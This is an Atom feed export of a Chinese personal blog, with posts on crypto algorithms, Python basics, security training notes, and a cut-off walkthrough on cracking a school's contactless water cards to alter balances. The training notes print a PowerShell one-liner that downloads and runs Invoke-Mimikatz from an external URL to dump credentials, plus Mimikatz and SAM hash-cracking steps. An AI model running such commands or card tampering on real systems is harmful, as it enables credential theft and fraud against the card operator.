，即有效密钥长度为56位。<br>自身不是加密的实用手段，必须以某种工作模式进行实际操作。<br>……</p><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><blockquote><p>密码学中的高级加密标准,用来替代原先的DES<br>AES采用对称分组密码体制，数据块分组长度必须为128比特，密钥长度可以是128比特、192比特、256比特中的任意一个</p></blockquote><p>AES加密算法有五种工作模式（加密模式）,根据数据加密时每个加密区块间的关联方式划分，包括ECB,CBC,CFB及OFB。可参见 <a href="http://www.cnblogs.com/starwolf/p/3365834.html" target="_blank" rel="noopener">AES五种加密模式</a></p><h4 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h4><blockquote><p>无线局域网标准的分组数据算法。SM4是一个分组对称密钥算法，明文、密钥、密文都是16字节，加密和解密密钥相同。<br>国家密码局认定的国产密码算法</p></blockquote><h3 id="非对称密码算法"><a href="#非对称密码算法" class="headerlink" title="非对称密码算法"></a>非对称密码算法</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><blockquote><p>参见阮一峰<br><a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="noopener">RSA算法原理一</a><br><a href="http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html" target="_blank" rel="noopener">RSA算法原理二</a></p><blockquote><ul><li>公钥用于加密，私钥用于解密</li><li>原理基于 <em>对于两个大素数的乘积的分解十分的困难！</em></li></ul></blockquote></blockquote><blockquote><p>—–数学乃万物之源呐</p></blockquote><h4 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h4><ul><li>签名要用用户的私钥</li><li>验证要用用户的公钥</li></ul><p>签名过程：</p><ul><li>使用MD5等散列算法生成消息摘要</li><li>使用RSA算法，用私钥对摘要进行加密</li></ul><p>验证过程：</p><ul><li>使用RSA算法，用公钥对传送的签名进行解密</li><li>使用MD5对原消息进行散列生成摘要，比较两个摘要异同</li></ul><h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><blockquote><p>DSA只是一种算法，和RSA不同之处在于它不能用作加密和解密，也不能进行密钥交换，<br><strong>只用于签名</strong>,它比RSA要快很多.<br>私钥签名，公钥验证</p></blockquote><h4 id="SM2"><a href="#SM2" class="headerlink" title="SM2"></a>SM2</h4><blockquote><p>该算法基于ECC，签名速度与秘钥生成速度都快于RSA。ECC 256位（SM2采用的就是ECC 256位的一种）安全强度比RSA 2048位高，但运算速度快于RSA。<br>国家密码局认定的国产密码算法</p></blockquote><h4 id="ELGamal"><a href="#ELGamal" class="headerlink" title="ELGamal"></a>ELGamal</h4><blockquote><p>加解密速度快,比RSA稍快.</p></blockquote><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><blockquote><p>全名Message Digest Algorithm 5 ，中文名为消息摘要算法第五版，主要是通过特定的hash散列方法将文本信息转换成简短的信息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。产生一个<strong>128</strong>位的散列值。具体算法有点复杂，主要步骤如下。</p><ul><li>填充</li><li>记录信息长度</li><li>装入幻数</li><li>四轮循环计算</li></ul><p>MD5 主要用于一致性检验、数字证书、安全访问认证(密码的验证，无需明文密码即可验证)</p></blockquote><blockquote><p>理论上MD5加密是绝对不可逆的一种算法，但是有一些收集海量信息的数据库，根据已知的对应关系找到原始信息。如 <a href="http://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a> <a href="http://pmd5.com/?action=getpwd" target="_blank" rel="noopener">PMD5</a> 部分简单的数据还是可以查找得到的，但是有的数据需要付费！</p></blockquote><p>md5 Java实现<br>    &gt; Java中，在包java.security有个MessageDigest类。使用其中的update 方法和digest 进行数据处理。<br>但因为digest()返回值16字长度的哈希值，要由byte[]承接，为了方便还要转换为十六进制的字符串。此处提供两种转换方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Md5</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            MessageDigest md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);<span class="comment">//申明使用MD5算法</span></span><br><span class="line">            md5.update(<span class="string">"hhhhhhh"</span>.getBytes());</span><br><span class="line">            System.out.println(<span class="string">"md5(hhhhhhh)="</span>+byte2str(md5.digest()));</span><br><span class="line">            md5.update(<span class="string">"fenghuayu"</span>.getBytes());</span><br><span class="line">            System.out.println(<span class="string">"md5(fenghuayu)="</span>+bytesToHex2(md5.digest()));</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将字节数组转换成十六进制字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">byte2str</span><span class="params">(<span class="keyword">byte</span> []bytes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] hex = &#123;<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> len = bytes.length;</span><br><span class="line">        StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">byte</span> byte0 = bytes[i];</span><br><span class="line">            result.append(hex[byte0 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">0xf</span>]);</span><br><span class="line">            result.append(hex[byte0 &amp; <span class="number">0xf</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 通过java提供的BigInteger 完成byte-&gt;HexString</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">bytesToHex2</span><span class="params">(<span class="keyword">byte</span>[] md5Array)</span> </span>&#123;</span><br><span class="line">        BigInteger bigInt = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, md5Array);</span><br><span class="line">        <span class="keyword">return</span> bigInt.toString(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>md5 php实现</p><blockquote><p>php的函数库中有封装好的MD5函数，返回值即为32位的十六进制数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(md5(<span class="string">"fenghuayu"</span>));</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h4><blockquote><p>SHA1算法对于长度小于2^64位的消息，产生一个<strong>160</strong>位的消息摘要。<br>比MD5慢一点但是安全性高一点。</p></blockquote><h4 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h4><blockquote><p>国家密码管理局颁布的密码杂凑算法,SM3算法对于长度小于2^64位的消息，产生一个<strong>256</strong>位的消息摘要。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一些密码算法&quot;&gt;&lt;a href=&quot;#一些密码算法&quot; class=&quot;headerlink&quot; title=&quot;一些密码算法&quot;&gt;&lt;/a&gt;一些密码算法&lt;/h2&gt;&lt;h3 id=&quot;古典密码&quot;&gt;&lt;a href=&quot;#古典密码&quot; class=&quot;headerlink&quot; title=&quot;古典密码&quot;&gt;&lt;/a&gt;古典密码&lt;/h3&gt;&lt;h4 id=&quot;凯撒密码&quot;&gt;&lt;a href=&quot;#凯撒密码&quot; class=&quot;headerlink&quot; title=&quot;凯撒密码&quot;&gt;&lt;/a&gt;凯撒密码&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;简单的字母移位&lt;br&gt;安全性太差、易破解，位移数字取值{0-25}&lt;br&gt;
    
    </summary>
    
    
      <category term="加密算法" scheme="https://blog.0bug.xyz/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>python笔记（一）</title>
    <link href="https://blog.0bug.xyz/2018/01/14/python%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://blog.0bug.xyz/2018/01/14/python笔记（一）/</id>
    <published>2018-01-14T07:00:00.000Z</published>
    <updated>2018-10-15T20:25:50.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python笔记（一）"><a href="#python笔记（一）" class="headerlink" title="python笔记（一）"></a>python笔记（一）</h2><h3 id="六个标准数据类型"><a href="#六个标准数据类型" class="headerlink" title="六个标准数据类型"></a>六个标准数据类型</h3><blockquote><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Sets（集合）</li><li>Dictionary（字典） <a id="more"></a></li></ul></blockquote><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><blockquote><p>int、float、bool、complex（复数）</p></blockquote><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><blockquote><ul><li>isinstance() &amp; type()<blockquote><p>isinstance()考虑继承关系<br>type() 并不考虑 子类与父类不同</p></blockquote></li></ul></blockquote><blockquote><ul><li>除法(/)总返回浮点数，若要获得整数，应使用(//)</li></ul></blockquote><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><blockquote><ul><li>截取语法：<br>print (str)          # 输出字符串<br>print (str[0:-1])    # 输出第一个到倒数第二个的所有字符<br>print (str[0])       # 输出字符串第一个字符<br>print (str[2:5])     # 输出从第三个开始到第五个的字符<br>print (str[2:])      # 输出从第三个开始的后的所有字符<br><strong>print (str * 2)</strong>      # 输出字符串两次<br>print (str + “TEST”) # 连接字符串</li></ul></blockquote><blockquote><ul><li>转义字符“\”<br>若不转义则在字符串前添加R或者r</li><li>python字符不可改变 即不可重新赋值</li></ul></blockquote><h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><blockquote><ul><li>内部元素可以修改</li><li>很像PHP中的数组 可以嵌套 支持多种数据类型</li></ul></blockquote><h4 id="Tuple"><a href="#Tuple" class="headerlink" title="Tuple"></a>Tuple</h4><blockquote><ul><li>使用括号进行书写</li></ul></blockquote><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h4><blockquote><p>is is not 判断两个标识符是不是来自于同一个对象</p></blockquote><h4 id="遍历序列"><a href="#遍历序列" class="headerlink" title="遍历序列"></a>遍历序列</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list:</span><br><span class="line">print(x,end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure><blockquote><p>a b c d</p></blockquote><ul><li><p>range() 遍历数字序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></li><li><p>因此可以使用range()来循环遍历序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">print(i,list[i])</span><br></pre></td></tr></table></figure></li></ul><h3 id="python迭代器、生成器"><a href="#python迭代器、生成器" class="headerlink" title="python迭代器、生成器"></a>python迭代器、生成器</h3><blockquote><p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p></blockquote><blockquote><p><strong>生成器</strong>是一个返回迭代器的函数，只能用于迭代操作（另一篇文章见）</p></blockquote><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><blockquote><ul><li>def 函数名（参数列表）:<pre><code>函数体</code></pre></li><li>python 中一切都是对象，严格意义我们不能说<strong>值传递</strong>还是<strong>引用传递</strong>，我们应该说传不可变对象(string,tuples,numbers)或传可变对象(list,dict)。</li></ul></blockquote><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><blockquote><ul><li>必需参数</li><li>关键字参数 <strong>使用关键字参数允许函数调用时参数的顺序与声明时不一致</strong></li><li>默认参数  <strong>默认参数在定义函数时体现</strong></li><li>不定长参数  </li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="keyword">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> );</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> );</span><br></pre></td></tr></table></figure><h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p><strong>需要一个函数，但是又不想费神去命名一个函数的场合下使用，也就是指匿名函数</strong></p><blockquote><ul><li>lambda的主体是一个表达式，而不是一个代码块</li><li>拥有自己命名空间</li><li>map(function,list)函数常用于此 其作用为对<strong>list中每个元素</strong>做映射按照function函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map( <span class="keyword">lambda</span> x: x*x, [y <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">10</span>)] )</span><br></pre></td></tr></table></figure></li></ul></blockquote><h4 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h4><blockquote><ul><li>L （Local） 局部作用域</li><li>E （Enclosing） 闭包函数外的函数中</li><li>G （Global） 全局作用域</li><li>B （Built-in） 内建作用域</li><li>以 L –&gt; E –&gt; G –&gt;B 的规则查找</li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;python笔记（一）&quot;&gt;&lt;a href=&quot;#python笔记（一）&quot; class=&quot;headerlink&quot; title=&quot;python笔记（一）&quot;&gt;&lt;/a&gt;python笔记（一）&lt;/h2&gt;&lt;h3 id=&quot;六个标准数据类型&quot;&gt;&lt;a href=&quot;#六个标准数据类型&quot; class=&quot;headerlink&quot; title=&quot;六个标准数据类型&quot;&gt;&lt;/a&gt;六个标准数据类型&lt;/h3&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Number（数字）&lt;/li&gt;
&lt;li&gt;String（字符串）&lt;/li&gt;
&lt;li&gt;List（列表）&lt;/li&gt;
&lt;li&gt;Tuple（元组）&lt;/li&gt;
&lt;li&gt;Sets（集合）&lt;/li&gt;
&lt;li&gt;Dictionary（字典）
    
    </summary>
    
    
      <category term="python" scheme="https://blog.0bug.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>蓝盾训练记录2</title>
    <link href="https://blog.0bug.xyz/2018/01/14/%E8%93%9D%E7%9B%BE%E8%AE%AD%E7%BB%83%E8%AE%B0%E5%BD%952/"/>
    <id>https://blog.0bug.xyz/2018/01/14/蓝盾训练记录2/</id>
    <published>2018-01-14T02:00:00.000Z</published>
    <updated>2018-10-15T20:25:57.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="windows系统漏洞"><a href="#windows系统漏洞" class="headerlink" title="windows系统漏洞"></a>windows系统漏洞</h4><blockquote><p>巨硬公司会定期将软件产品中发现的重大问题以安全公告的形式公布于众，可在 <a href="https://technet.microsoft.com/zh-cn/library/security/" target="_blank" rel="noopener">安全公告</a> 上查看。<br>公告解释：</p><ul><li>唯一的编号，即MS-，如MS03-063，MS是微软的英文缩写，03代表2003年，063代表该安全公告的编号.<br>公告中巨硬公司都会给出一个形如Q（2003年4月份前用此编号）或KB（2003年4月份后用此编号）的编号，通过该编号我们可以在 <a href="support.microsoft.com">微软知识库</a> 中查找到有关该问题的所有技术性文章和相应的解决方案，也可在 <a href="https://technet.microsoft.com/zh-cn/security/bulletins" target="_blank" rel="noopener">TechNet</a> 上搜索相关资料。<a id="more"></a></li></ul></blockquote><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote><p>Windows密码抓取神器  <a href="http://www.vuln.cn/6349" target="_blank" rel="noopener">指南&amp;命令参考</a><br>亦可提升进程权限 注入进程 读取进程内存<br>抓取原理:<br>win登录的时候输入的密码，经过lsass.exe里的wdigest和tspkg两个模块调用后，它们对之进行加密处理，而没有进行擦除，而且该加密通过特征可以定位，并且按照微软的算法可逆。<br>简单地说，在Windows中，当用户登录时，lsass.exe使用一个可逆的算法，加密过的明文密码，并且把密文保存在内存中，没有清理，然后可以抓出来，还原。</p></blockquote><p>抓取密码常用命令</p><p>privilege::debug  //提升权限<br>sekurlsa::logonpasswords   //抓取密码</p><p>一个powershell脚本将mimikatz注入到内存并自动调用logonPasswords获取密码(墙)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure></p><p>如何防御：<br><a href="http://www.freebuf.com/sectool/96209.html" target="_blank" rel="noopener">更新补丁注册表</a></p><h4 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h4><blockquote><p>目前的压缩包破解工具基本都是利用穷举法，一个一个密码的去尝试，而这种方法效率低，成功率低，如果密码稍微长一些或者加入中文，那代价将是非常高的。如果有一个比较好用的字典，可以将消耗的时间大大的减少。</p></blockquote><p>以下为两个破解方法：</p><blockquote><ul><li>首先可以使用工具去除压缩包的密码，而不是去暴力破解<br>Advanced rar repair 便是一款此类软件，但基本上去除密码的压缩包都会损坏，个别类型文档完好。而且该软件只支持RAR格式的压缩包。 </li><li>另一种就是直接暴力破解，ARCHPR 是一个破解简单压缩包密码工具，支持自定义字典，但是速度并不是很快……并且该软件</li></ul></blockquote><h4 id="文件隐藏命令、工具"><a href="#文件隐藏命令、工具" class="headerlink" title="文件隐藏命令、工具"></a>文件隐藏命令、工具</h4><p>win下：</p><blockquote><ul><li>[md 命令]–创建新的子目录</li><li>[attrib命令]–修改属性<ul><li>ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H] [[drive:] [path] filename] [/S [/D]</li><li>R只读文件属性；A存档文件属性；S系统文件属性；H隐藏文件属性；<br>可以完全隐藏一个文件 —&gt; [attrib +h +r +s filename]</li></ul></li></ul></blockquote><p>Linux下：</p><blockquote><ul><li>[mkdir] –创建文件夹</li><li>[mv]–移动文件或改名<ul><li>-b ：若需覆盖文件，则覆盖前先行备份。</li><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</li><li>-i ：若目标文件已经存在时，就会询问是否覆盖</li><li>-u ：若目标文件已经存在，且source比较新，才会更新</li><li>-t ： –target-directory=DIRECTORY move all SOURCE arguments into DIRECTORY，即指定mv的目标目录，该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后。</li></ul></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;windows系统漏洞&quot;&gt;&lt;a href=&quot;#windows系统漏洞&quot; class=&quot;headerlink&quot; title=&quot;windows系统漏洞&quot;&gt;&lt;/a&gt;windows系统漏洞&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;巨硬公司会定期将软件产品中发现的重大问题以安全公告的形式公布于众，可在 &lt;a href=&quot;https://technet.microsoft.com/zh-cn/library/security/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全公告&lt;/a&gt; 上查看。&lt;br&gt;公告解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;唯一的编号，即MS-，如MS03-063，MS是微软的英文缩写，03代表2003年，063代表该安全公告的编号.&lt;br&gt;公告中巨硬公司都会给出一个形如Q（2003年4月份前用此编号）或KB（2003年4月份后用此编号）的编号，通过该编号我们可以在 &lt;a href=&quot;support.microsoft.com&quot;&gt;微软知识库&lt;/a&gt; 中查找到有关该问题的所有技术性文章和相应的解决方案，也可在 &lt;a href=&quot;https://technet.microsoft.com/zh-cn/security/bulletins&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;TechNet&lt;/a&gt; 上搜索相关资料。
    
    </summary>
    
    
      <category term="信息安全" scheme="https://blog.0bug.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>蓝盾训练记录</title>
    <link href="https://blog.0bug.xyz/2018/01/13/%E8%93%9D%E7%9B%BE%E8%AE%AD%E7%BB%83%E8%AE%B0%E5%BD%95/"/>
    <id>https://blog.0bug.xyz/2018/01/13/蓝盾训练记录/</id>
    <published>2018-01-13T12:00:00.000Z</published>
    <updated>2018-10-15T20:26:04.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="彩虹表破解win本地密码"><a href="#彩虹表破解win本地密码" class="headerlink" title="彩虹表破解win本地密码"></a>彩虹表破解win本地密码</h4><p>使用工具：</p><blockquote><ul><li>PwDump7.exe 从SAM数据库中提取HASH口令</li><li>Opcrack 解析获取的Hash值<a id="more"></a>Tips:</li><li>windows对用户账户的安全管理使用了安全账号管理器(Security Account Manager，简称SAM)的机制。</li><li>SAM数据库在磁盘上保存在%systemroot%system32\config\目录下的sam文件中。</li><li>SAM数据库中包含所有组、帐户的信息，包括密码的HASH、帐户的SID等。</li><li>在对SAM破解之前，首先要获取SAM文件，登陆Windows系统后SAM是被锁死的，我们可以用pwdump，samdump，SAMInside，gethash等获取SAM文件：</li><li>Windows NT对同一用户口令采用两套单向哈希函数进行运算，即单向LAN Manager 哈希（LM 哈希）算法和单向Windows NT 哈希（NT 哈希）散列算法，两种算法的结果都保存在SAM文件中。</li></ul></blockquote><h4 id="彩虹表："><a href="#彩虹表：" class="headerlink" title="彩虹表："></a>彩虹表：</h4><blockquote><p>听说MD5等公开算法在这玩意面前不堪一击……瑟瑟发抖</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;彩虹表破解win本地密码&quot;&gt;&lt;a href=&quot;#彩虹表破解win本地密码&quot; class=&quot;headerlink&quot; title=&quot;彩虹表破解win本地密码&quot;&gt;&lt;/a&gt;彩虹表破解win本地密码&lt;/h4&gt;&lt;p&gt;使用工具：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;PwDump7.exe 从SAM数据库中提取HASH口令&lt;/li&gt;
&lt;li&gt;Opcrack 解析获取的Hash值
    
    </summary>
    
    
      <category term="信息安全" scheme="https://blog.0bug.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>非接触式IC卡破解</title>
    <link href="https://blog.0bug.xyz/2017/07/08/%E9%9D%9E%E6%8E%A5%E8%A7%A6%E5%BC%8FIC%E5%8D%A1%E7%A0%B4%E8%A7%A3/"/>
    <id>https://blog.0bug.xyz/2017/07/08/非接触式IC卡破解/</id>
    <published>2017-07-07T17:00:00.000Z</published>
    <updated>2019-01-21T16:34:11.337Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>　　本文算是写过的第一篇技术文章，于高二下学期。当时发帖于贴吧，但由于一些原因被迫删帖。现在搭建好了个人博客，便想修改一下将此文作为本博客第一篇文章。<br>　　高二时期，由于学校每月返还四元的的水费不够用,加上看到别的同学因系统错误而偶然获得的两张九万多的水卡，便驱动着自己去对此暗暗了解一番。<br>  <strong>以下为原帖内容，少数文字被修改</strong>。<br>  <a id="more"></a></p><h1 id="原帖"><a href="#原帖" class="headerlink" title="原帖"></a>原帖</h1><p>　　在学校上了两周课，回到家后在网上找了又找，发现关于破解IC卡的文章真是不多，凑凑乎乎不过那十几篇，不过经过一段时间的努力，大体了解了IC卡的内部构造原理，现在可以任意修改里面的水费啦！注意：只是水费……（原因后面说）<br><img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic5.jpg" alt=""></p><h2 id="开工"><a href="#开工" class="headerlink" title="开工"></a>开工</h2><p>　　闲话不说了，下面是破解过程和一些教程。<br>　　首先我们要有一台可以读取IC卡的读卡器，像咱们学校卡务中心的那样的。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic8.jpg" alt=""><br>　　理论上这个机器是可以的，但是由于网上缺少对此机器的软件支持，只有一些简单的读写软件，没有破解之类的，所以会对密码的破解造成很大的难度。而且这类读卡器不是USB接口的，是平常很难见到的串口接口，像学校旁边的那些网吧因同行竞争都换成了一体机，根本找不到这类接口，（安居那边的传奇网吧有这个接口，但是网吧最近好像倒闭了）而家里的电脑也一般不配备此接口。虽然可以再配一根USB转串口的转换线，但是还是很不方便！因此我们选择下面一款软件支持较多，同时网上许多大神都用的一款机器：ACR122U。<br>  <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic9.jpg" alt=""><br>　　接入电脑后，有的可能需要安装驱动，这里说一下学校旁边的红客网吧不能用，因为驱动装不上，再旁边的第六感就可以！但是第六感的电脑对后面的一款用到的软件又不兼容……</p><h4 id="读卡器连接电脑"><a href="#读卡器连接电脑" class="headerlink" title="读卡器连接电脑"></a>读卡器连接电脑</h4><p>　　如果驱动安装成功，读卡器会亮红灯，放上卡片时亮绿灯<br>  <div align="center"><br>  <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic12.jpg" alt=""><br>  </div><br>  <div align="center"><br>  <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/pic13.jpg" alt=""><br>  </div></p><h4 id="运行M1卡服务程序"><a href="#运行M1卡服务程序" class="headerlink" title="运行M1卡服务程序"></a>运行M1卡服务程序</h4><p>  <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture1.PNG" alt=""><br>　　该软件设计非常简单，只有一个按钮，开始破解，那我们就开始破解喽~第一次对卡操作的时候需要的时间有点长，大概三五分钟，以后再读取同一张卡的话就会很快的！</p><h4 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h4><p>　　完成上一步骤后，会在M1卡服务程序统计目录下得到一个数据文件<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture3.PNG" alt=""><br>　　该文件是以IC卡uid为名字的1kb的dump格式文件，但是这个是不能直接使用的，我们需要用另一个软件<strong>NFCGUI-Pro</strong>将此文件修复成大小为4kb的文件<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture4.PNG" alt=""><br>　　使用时直接将dump文件拖拽进去就可以，软件会自动将其转换。<br> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture8.PNG" alt=""></p><h4 id="分析数据"><a href="#分析数据" class="headerlink" title="分析数据"></a>分析数据</h4><p> <img src="https://blog-1252921857.cos.ap-chengdu.myqcloud.com/picture9.PNG" 